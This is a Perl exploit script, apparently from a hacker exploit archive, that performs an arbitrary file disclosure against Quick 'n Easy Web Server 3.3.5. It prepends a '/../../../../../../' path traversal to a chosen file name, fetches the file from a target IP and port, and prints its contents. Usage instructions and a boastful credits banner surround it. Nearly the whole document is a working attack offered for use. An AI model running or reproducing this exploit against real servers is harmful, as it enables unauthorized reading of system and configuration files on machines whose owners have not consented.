#!/usr/bin/perl -w
#
# Found By : Cyber-Zone (ABDELKHALEK)
# Paradis_des_fous@hotmail.fr
#
#
# Note : Don't use this for your own R!sk :d
#
#
# Thanx To All Friends : Hussin X , Jiko , Stack , SimO-sofT , r1z , ZoRLu , Mag!c ompo , ThE g0bL!N , b0rizq , All MoroCCaN Hackers

#
# demo version Tested under my MS WINDOWS sp2
#
# download : http://www.softpedia.com/progDownload/Quick-n-Easy-Web-Server-Download-45387.html
# Screenshot : http://www.exploiter5.com/blog/directory-traversal.png
#
use LWP::Simple;
use LWP::UserAgent;

print "\tQuick 'n Easy Web Server 3.3.5 Arbitrary File Disclosure Exploit\n";

print "\t****************************************************************\n";
print "\t*      Found And Exploited By : Cyber-Zone (ABDELKHALEK)       *\n";
print "\t*           E-mail : Paradis_des_fous[at]hotmail.fr            *\n";
print "\t*          Home : WwW.IQ-TY.CoM , WwW.No-Exploit.CoM           *\n";
print "\t*               From : MoroccO Figuig/Oujda City               *\n";
print "\t****************************************************************\n\n\n\n";

if(@ARGV < 4)
{
&help; exit();
}
sub help()
{
print "[X] Usage : perl $0 HackerName IP Port File\n";
print "[X] Exemple : perl $0 Cyber-Zone 127.0.0.1 80 boot.ini\n";
}
($HackerName, $TargetIP, $AttackedPort, $TargetFile) = @ARGV;
print("Please Wait ! Connecting To The Server ......\n\n");
sleep(5);

print("          ******************************\n");
print("          *             Status         *\n");
print("          ******************************\n");
print("Loading ........................................\n\n\n");

$temp="/../../../../../../";
my $boom = "http://" . $TargetIP . ":" . $AttackedPort . $temp . $TargetFile;
print("Exploiting .....>    |80\n");
sleep(15);
print("Exploiting ..........|Done!\n");
sleep(5);
$Disclosure=get $boom;
if($Disclosure){
print("\n\n\n\n............File Contents Are Just Below...........\n");
print("$Disclosure \n");
print(".........................EOF.......................\n");
print("Done For Fun //Figuigian HaCker\n");
print("Some Womens Makes The World Special , Just By Being On it <3\n");
print("SEE U $HackerName\n\n\n");
}
else
{
print(" Not Found !!!\n\n");
exit;
}

